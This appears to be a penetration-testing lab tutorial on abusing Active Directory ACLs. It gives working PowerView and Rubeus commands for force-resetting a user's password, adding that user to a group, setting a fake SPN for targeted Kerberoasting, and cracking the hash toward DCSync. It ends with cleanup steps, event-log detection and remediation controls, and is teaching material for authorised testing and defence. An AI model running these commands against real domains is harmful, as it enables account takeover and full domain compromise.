# ACL Abuse Tactics

With the attack chain enumerated in the previous section, this covers the actual execution of each step from initial foothold to DCSync-ready access, along with how to clean up and what defenders can monitor.

***

## The Attack Chain at a Glance

Starting with `wley` (obtained via Responder and Hashcat), the path to domain compromise runs through three exploitation steps:

1. Force-change `damundsen`'s password using `wley`'s `ForceChangePassword` right
2. Add `damundsen` to `Help Desk Level 1` using `GenericWrite`, inheriting `Information Technology` group rights via nested membership
3. Use `GenericAll` over `adunn` to assign a fake SPN and Kerberoast the account, eventually reaching DCSync

***

## Step 1: Force Change damundsen's Password

Authenticate as `wley` by creating a `PSCredential` object:

```powershell
$SecPassword = ConvertTo-SecureString '<wley_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Create a `SecureString` for the new password you want to set on `damundsen`:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Execute the password reset using PowerView's `Set-DomainUserPassword`:

```powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Output confirms success:

```
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

Always use `-Verbose` on every PowerView function call. It confirms success or surfaces errors clearly.

***

## Step 2: Add damundsen to Help Desk Level 1

Create a new credential object for `damundsen` using the password just set:

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Confirm `damundsen` is not already a member:

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

Add `damundsen` to the group using `GenericWrite`:

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Verify membership was added:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

`damundsen` now appears in the group output. Through nested membership, `damundsen` inherits the rights of the `Information Technology` group, including `GenericAll` over `adunn`.

***

## Step 3: Targeted Kerberoasting of adunn

Since `adunn` is an active admin account that should not have its password reset, the better approach is a targeted Kerberoasting attack. `GenericAll` grants the right to write any attribute, including `servicePrincipalName`. Setting a fake SPN on the account makes it Kerberoastable without touching the password.

Assign the fake SPN using `damundsen`'s credentials (which carry `Information Technology` group membership):

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Output:

```
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

Kerberoast the account using Rubeus:

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

Rubeus will pull back a TGS hash for `adunn` at `notahacker/LEGIT`. Feed that to Hashcat with mode `13100` to crack the password offline. Once cracked, `adunn` can be used to perform the DCSync attack.

***

## Cleanup (Order Matters)

You must clean up in this exact order. If you remove `damundsen` from the group first, you lose the credentials needed to remove the fake SPN.

### 1. Remove the fake SPN from adunn

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

Output:

```
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

### 2. Remove damundsen from Help Desk Level 1

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

### 3. Confirm removal

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'} -Verbose
```

No output means successful removal. Note that `damundsen`'s password will still be the one you set. Either restore the original if known, or notify the client to reset it and inform the affected user.

Even after full cleanup, every action taken must be documented in the final report, including timestamps, objects modified, and confirmation that changes were reverted.

***

## Detection and Remediation

### For Defenders

**Event ID 5136** (`A directory service object was modified`) fires when ACL modifications occur and is the primary log entry to monitor. Enable it via `Advanced Security Audit Policy > Audit Directory Service Changes`. The event records changes in [Security Descriptor Definition Language (SDDL)](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language), which is not human-readable by default. Convert it using:

```powershell
ConvertFrom-SddlString "<SDDL string>" | select -ExpandProperty DiscretionaryAcl
```

This reveals plaintext permission entries such as:

```
INLANEFREIGHT\mrb3n: AccessAllowed (GenericWrite, CreateDirectories, ...)
```

An unexpected `GenericWrite` or `GenericAll` entry on a domain object for a non-admin user is a strong indicator of ACL-based attack activity.

### Recommended Controls

| Control | Purpose |
|---------|---------|
| Regular AD ACL audits using BloodHound | Identify dangerous ACE misconfigurations before attackers do |
| Alert on privileged group membership changes | Detect `Add-DomainGroupMember` abuse in Domain Admins, IT groups |
| Monitor SPN creation events (Event ID 4769, 4770) | Detect targeted Kerberoasting via `Set-DomainObject` |
| Enable Advanced Security Audit Policy | Surface Event ID 5136 for all directory object modifications |
| Remove excessive ACEs left by software installs | Exchange, Symantec, and others routinely add broad ACEs at install time |
